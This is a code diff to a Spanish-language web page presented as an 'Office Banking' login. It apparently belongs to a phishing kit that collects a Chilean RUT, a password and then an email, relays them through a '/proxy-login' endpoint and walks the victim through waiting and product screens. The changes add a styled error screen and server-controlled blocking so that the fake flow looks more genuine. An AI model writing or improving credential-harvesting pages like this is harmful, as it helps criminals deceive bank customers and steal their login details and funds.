@@ -178,6 +178,43 @@
   <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
 
     <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>
+<!-- BLOQUE DE ERROR -->
+<div id="pantallaError" class="hidden" style="text-align:center; padding:25px;">
+
+  <!-- Ícono -->
+  <div style="
+    width:80px;
+    height:80px;
+    margin:0 auto 20px auto;
+    border-radius:50%;
+    background:#d9534f;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  ">
+    <span style="
+      color:white;
+      font-size:45px;
+      font-weight:bold;
+      line-height:0;
+    ">×</span>
+  </div>
+
+  <!-- Texto -->
+  <h2 style="font-size:20px; font-weight:bold; margin-bottom:10px;">
+    REVISA LOS DATOS INGRESADOS.
+  </h2>
+
+  <p id="mensajeError" style="font-size:16px; color:#555; margin-bottom:25px;">
+    Algunos de los datos ingresados no son correctos.<br>
+    Por favor, inténtalo nuevamente.
+  </p>
+
+  <!-- Botón -->
+  <button class="btn-red w-100" onclick="volverInicio()">
+    Aceptar
+  </button>
+</div>
 
     <div class="login-box">
 
@@ -291,23 +328,53 @@ function validarRut(r){
   return dv===e;
 }
 
+/* Mostrar error visual */
+function mostrarError(msg){
+  loginForm.classList.add("hidden");
+  pantallaEspera.classList.add("hidden");
+  formCorreo.classList.add("hidden");
+  pantallaSeleccion.classList.add("hidden");
+  pantallaProductos.classList.add("hidden");
+
+  mensajeError.innerHTML = msg;
+  pantallaError.classList.remove("hidden");
+}
+
+/* Volver al inicio */
+function volverInicio(){
+  window.location.href = "/";
+}
+
 /* LOGIN */
 loginForm.addEventListener("submit", async e=>{
   e.preventDefault();
 
   if(!validarRut(rut.value)){
-    resultado.innerText="❌ RUT inválido";
+    mostrarError("RUT inválido");
     return;
   }
 
   try{
-    await fetch("/proxy-login",{
+    const res = await fetch("/proxy-login",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({ rut:rut.value, passwd:passwd.value })
     });
-  }catch(e){}
 
+    const data = await res.json();
+
+    // 🔥 BLOQUEO REAL
+    if (!res.ok || data.status === "error") {
+      mostrarError(data.mensaje || "Acceso bloqueado");
+      return; // ⛔ DETIENE EL FLUJO
+    }
+
+  }catch(e){
+    mostrarError("Error de conexión");
+    return;
+  }
+
+  // 🔥 SOLO si NO está bloqueado avanza
   loginForm.classList.add("hidden");
   pantallaEspera.classList.remove("hidden");
 
@@ -320,13 +387,26 @@ loginForm.addEventListener("submit", async e=>{
 /* CORREO */
 async function enviarCorreo(){
   try{
-    await fetch("/proxy-login",{
+    const res = await fetch("/proxy-login",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({ mail:correo.value })
     });
-  }catch(e){}
 
+    const data = await res.json();
+
+    // 🔥 BLOQUEO REAL
+    if (!res.ok || data.status === "error") {
+      mostrarError(data.mensaje || "Acceso bloqueado");
+      return;
+    }
+
+  }catch(e){
+    mostrarError("Error de conexión");
+    return;
+  }
+
+  // 🔥 SOLO si NO está bloqueado avanza
   formCorreo.classList.add("hidden");
   pantallaEspera.classList.remove("hidden");
 
